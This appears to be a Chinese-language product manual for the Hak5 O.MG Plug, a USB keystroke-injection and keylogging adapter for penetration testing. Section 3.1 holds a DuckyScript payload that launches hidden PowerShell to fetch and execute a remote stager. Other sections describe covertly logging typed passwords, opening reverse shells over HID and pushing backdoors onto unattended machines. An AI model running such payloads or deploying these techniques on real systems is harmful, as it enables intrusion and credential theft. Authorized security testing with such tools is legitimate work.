---
title: "Hak5 O.MG Plug & Adapter 原厂技术说明书与全功能操作手册"
model: "O.MG Plug"
manufacturer: "Hak5"
category: "模块化串接式 USB 实体攻击与按键注入转接头 (Modular USB Adapter)"
docs_url: "https://o.mg.lol/setup/OMGPlug/"
version: "3.0"
locale: "zh-cn"
---

# Hak5 O.MG Plug & Adapter 原厂技术说明书与全功能操作手册

> Hak5 出品的 O.MG Plug（以及 O.MG Adapter 转接器）是 O.MG 渗透测试体系的模块化实体演进版本。将完整的 O.MG SoC 芯片组、802.11 Wi-Fi 无线电与 DuckyScript 攻击引擎精准封装于通用型 USB 转接头外壳中，支持串接任意周边键盘与设备，或作为无人值守的独立 USB 快速攻击载具。

---

## 目录

- [**1. 产品概述与硬件架构**](#1-产品概述与硬件架构)
  - [1.1 模块化转接头设计理念](#11-模块化转接头设计理念)
  - [1.2 技术规格与硬件校准基准表](#12-技术规格与硬件校准基准表)
  - [1.3 串接拦截与无人值守双重部署模式](#13-串接拦截与无人值守双重部署模式)
- [**2. 硬件初始化、固件刻录与网络连接**](#2-硬件初始化固件刻录与网络连接)
  - [2.1 使用 O.MG Programmer 进行初次激活](#21-使用-omg-programmer-进行初次激活)
  - [2.2 Web Flasher 浏览器串行刻录指引](#22-web-flasher-浏览器串行刻录指引)
  - [2.3 创建 Wi-Fi 管理无线基地台](#23-创建-wi-fi-管理无线基地台)
  - [2.4 网页控制台功能巡礼与参数调整](#24-网页控制台功能巡礼与参数调整)
- [**3. 载荷编写、DuckyScript 语法与运行模式**](#3-载荷编写duckyscript-语法与运行模式)
  - [3.1 DuckyScript for O.MG Plug 内核指令](#31-duckyscript-for-omg-plug-内核指令)
  - [3.2 载荷槽位架构与远程快速触发](#32-载荷槽位架构与远程快速触发)
  - [3.3 串联 USB 实体键盘嗅探机制 (Keylogger)](#33-串联-usb-实体键盘嗅探机制-keylogger)
  - [3.4 跨国键盘配置对应与转译](#34-跨国键盘配置对应与转译)
- [**4. HIDX StealthLink 隐蔽传输与舰队管理**](#4-hidx-stealthlink-隐蔽传输与舰队管理)
  - [4.1 HIDX 双向信道原理说明](#41-hidx-双向信道原理说明)
  - [4.2 跨平台交互式终端管道](#42-跨平台交互式终端管道)
  - [4.3 Hak5 Cloud C² 云端集中舰队纳管](#43-hak5-cloud-c-云端集中舰队纳管)
  - [4.4 WebSocket API 自动化串接实例](#44-websocket-api-自动化串接实例)
- [**5. 安全防御、自毁抹除与维护指南**](#5-安全防御自毁抹除与维护指南)
  - [5.1 地理围栏环境限制配置](#51-地理围栏环境限制配置)
  - [5.2 紧急硬件自毁标准进程](#52-紧急硬件自毁标准进程)
  - [5.3 故障排查、芯片校准与出厂重置](#53-故障排查芯片校准与出厂重置)

---

## 1. 产品概述与硬件架构

<!-- section：overview -->
本章节说明 O.MG Plug / Adapter 的模块化硬件架构、规格参数与部署形式。

### 1.1 模块化转接头设计理念

O.MG Cable 将攻击芯片深嵌于一条专属线缆中；而 O.MG Plug 则将这套先进的微型系统封装成通用的转接插头（提供 USB Type-A 插头与 USB Type-C 转接器等多种形式）。

此设计具备极大优势：
- **兼容任意品牌线材**：现场可随意串接目标既有的专用传输线、条码扫描仪、鼠标或机械键盘。
- **随机应变部署**：既可安插在主机后方充当长期串接键盘嗅探器，亦可做为无人值守的一键注入 USB Key。
- **高耐用性外壳**：金属强化结构，经得起多次实体插拔。

### 1.2 技术规格与硬件校准基准表

| 硬件组件项目 | 原厂官方技术规格基准 |
|---|---|
| **设备架构** | 模块化串接式 USB 实体攻击转接头 |
| **射频无线电** | 集成式 802.11 b/g/n (2.4 GHz) Wi-Fi 无线电与微型天线 |
| **输入工作电压** | 5 V DC (+/- 0.5 V) 经由主机 USB 端口供电 |
| **功耗标准** | 待机：~75 mA；尖峰发射：~320 mA；建议供电：500 mA |
| **数据通信透传** | 完整 USB 2.0 (480 Mbps) 全速透传信道 (攻击闲置时完全透明) |
| **电力透传规格** | 固定 5 V 导通；USB-PD 协商最高限制于 5 V |
| **物理规格外观** | USB Type-A 转接头、USB Type-C 模块化插头 |
| **保存磁区规模** | 非挥发性 Flash 空间 (Basic：8 槽位；Plus/Elite：最高 200 槽位) |
| **嗅探容量规格** | Keylogger 版：内置约 650,000 次按键先进先出 (FIFO) 缓冲内存 |
| **硬件兼容标准** | Full Speed 全速 USB 键盘 (兼容 12 Mbps 标准 HID 规范) |
| **隐蔽信道技术** | HIDX StealthLink (利用底层 HID Reports 实现双向 Shell) |
| **防护安全机制** | WPA2 加密、BSSID 地理围栏防御、单片机紧急自毁功能 |

### 1.3 串接拦截与无人值守双重部署模式

1. **串接周边拦截模式 (Inline Peripheral Interception Mode)**：
   - 将 O.MG Plug 插入目标主机 USB 孔，再将目标实体键盘插入 O.MG Plug 的母座。
   - 用户日常打字完全无感，但所有击键均被即时记录，且操作者可随时通过无线射频注入攻击指令。
2. **无人值守随身注入模式 (Unattended Standalone Dongle Mode)**：
   - 直接将 O.MG Plug 插入无人看管的目标服务器或信息站（Kiosk）。
   - 设备自动感知主机通电，数秒内依序派发提权、下载后门与数据导出脚本。

---

## 2. 硬件初始化、固件刻录与网络连接

<!-- section：configuration -->
本章节说明 O.MG Plug 的出厂激活、浏览器串行刻录与连接流程。

### 2.1 使用 O.MG Programmer 进行初次激活

所有 O.MG Plug 设备均需使用 O.MG Programmer 激活无线发射功能：
1. 将 O.MG Plug 公头插入 O.MG Programmer 母座。
2. 将 Programmer 连接至工作站电脑，确认供电指示灯恒亮。

### 2.2 Web Flasher 浏览器串行刻录指引

1. 使用 Chrome 或兼容 WebSerial 之浏览器造访：`https://o-mg.github.io/WebFlasher/`
2. 点击 **Connect** 并选取 CP2102 串行端口。
3. 产品菜单选取 **O.MG Plug / Adapter**，点击最新固件进行一键刷机。

### 2.3 创建 Wi-Fi 管理无线基地台

1. 拔除 Programmer，将 O.MG Plug 插入一般 5 V USB 供电孔。
2. 连接至默认基地台：
   - **SSID**：`O.MG`
   - **密码**：`12345678`
3. 浏览器打开 `http://192.168.4.1` 进入配置后台。

### 2.4 网页控制台功能巡礼与参数调整

- **Payloads 页面**：编写、上传与点击运行脚本。
- **Keylogger 页面**：即时监看击键日志与文本搜索。
- **Settings 页面**：更改无线名称、加入公司 Wi-Fi（Station 模式）或配置自毁条件。

---

## 3. 载荷编写、DuckyScript 语法与运行模式

<!-- section：features -->
本章节说明 DuckyScript 指令撰写与键盘拦截操作。

### 3.1 DuckyScript for O.MG Plug 内核指令

```text
REM O.MG Plug Fast Execution Example
DELAY 2000
GUI r
DELAY 300
STRING powershell -w hidden -c“Invoke-RestMethod http://192.168.4.1/stager | iex”
ENTER
```

支持 `DELAY` 延迟、`STRING` 键入、`USB_OVERCLOCK` 传输加速与 `WAIT_FOR_INPUT` 操作员确认指令。

### 3.2 载荷槽位架构与远程快速触发

Plus 与 Elite 版本支持高达 200 个槽位，操作者可在手机 Web 接口创建自订捷径按钮，于百公尺外随点随打。

### 3.3 串联 USB 实体键盘嗅探机制 (Keylogger)

串接键盘时，O.MG Plug 的专用处理内核会并行解析 USB 数据包，并将密码、指令与机密即时加密保存于非挥发内存中，操作者可在网页端即时观看。

### 3.4 跨国键盘配置对应与转译

内置多语系映射内核，支持全球各大主要语系键盘，确保在非英文环境下输入符号依然百分之百精准。

---

## 4. HIDX StealthLink 隐蔽传输与舰队管理

### 4.1 HIDX 双向信道原理说明

利用 USB HID 协定规范的 Feature Reports 通信机制，不需要打开任何网络端口、不安装驱动，直接打通目标主机与 O.MG Plug 之间的双向信道。

### 4.2 跨平台交互式终端管道

支持在 Windows（PowerShell）、Linux（Bash）与 macOS（Python）环境下反向引导出完全交互式的终端机控制台。

### 4.3 Hak5 Cloud C² 云端集中舰队纳管

将各办公室部署的 O.MG Plug 配置为 Station 模式连上网际网络，即可在 Hak5 Cloud C² 云端后台集中调度与监管。

### 4.4 WebSocket API 自动化串接实例

开放标准 WebSocket 接口，方便网络安全工程师以 Python 撰写自动化插件，达成自动嗅探、敏感词通知与主动回击。

---

## 5. 安全防御、自毁抹除与维护指南

<!-- section：maintenance -->
本章节介绍自毁保护、地理围栏与出厂重置。

### 5.1 地理围栏环境限制配置

锁定现场特定 Wi-Fi BSSID，一旦离开受测区域即自动切断连接或进入深度休眠。

### 5.2 紧急硬件自毁标准进程

发动 `Self-Destruct` 指令后，单片机会立即对芯片内部进行高压随机覆写并自毁引导程序，使物理逆向工程彻底失效。

### 5.3 故障排查、芯片校准与出厂重置

若遇通信异常，可将 O.MG Plug 插回 O.MG Programmer，利用 Web Flasher 进行“Erase Flash & Factory Reset”即可还原初始配置。
